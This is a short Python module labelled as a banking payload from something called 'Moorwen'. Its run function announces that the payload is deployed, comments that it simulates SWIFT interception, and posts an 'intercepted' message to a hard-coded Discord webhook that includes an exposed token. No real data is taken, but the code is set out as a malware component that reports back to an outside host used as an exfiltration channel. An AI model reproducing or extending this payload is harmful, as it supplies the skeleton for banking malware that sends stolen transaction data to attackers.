# ============================================================
# MOORWEN — BANKING PAYLOAD
# ============================================================

import requests
import json

def run():
    print("[*] Banking payload deployed.")
    # Simulate SWIFT interception
    webhook = "https://discord.com/api/webhooks/1541184615719374990/ij1wnF8bf0CULSDYZKUyIEkWWKn7whlClnq9fMa8vGHHEPVanQyUn8WwIiXogfHsx3go"
    data = {"message": "SWIFT transaction intercepted"}
    requests.post(webhook, json={"content": json.dumps(data)})
